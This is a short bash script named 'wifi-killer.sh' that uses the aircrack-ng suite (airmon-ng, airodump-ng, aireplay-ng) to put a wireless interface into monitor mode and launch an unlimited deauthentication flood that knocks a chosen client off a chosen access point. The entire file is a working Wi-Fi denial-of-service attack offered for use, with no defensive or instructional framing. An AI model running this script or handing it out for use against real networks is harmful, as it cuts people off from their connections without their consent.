#!/bin/bash

# USAGE: wifi-killer.sh NETWORK_INTERFACE AP_MAC_ADDR TARGET_MAC_ADDR

network_interface=$1
AP_MAC_ADDR=$2
TARGET_MAC_ADDR=$3

if [ "$#" -ne 3 ]; then
	echo "USAGE: wifi-killer.sh NETWORK_INTERFACE AP_MAC_ADDR TARGET_MAC_ADDR"
	exit 1
fi

sudo airmon-ng start $network_interface
sudo airmon-ng check kill
timeout -k 5 5 sudo airodump-ng -c11 -d $AP_MAC_ADDR $network_interface
sudo aireplay-ng -0 0 -a $AP_MAC_ADDR -c $TARGET_MAC_ADDR $network_interface
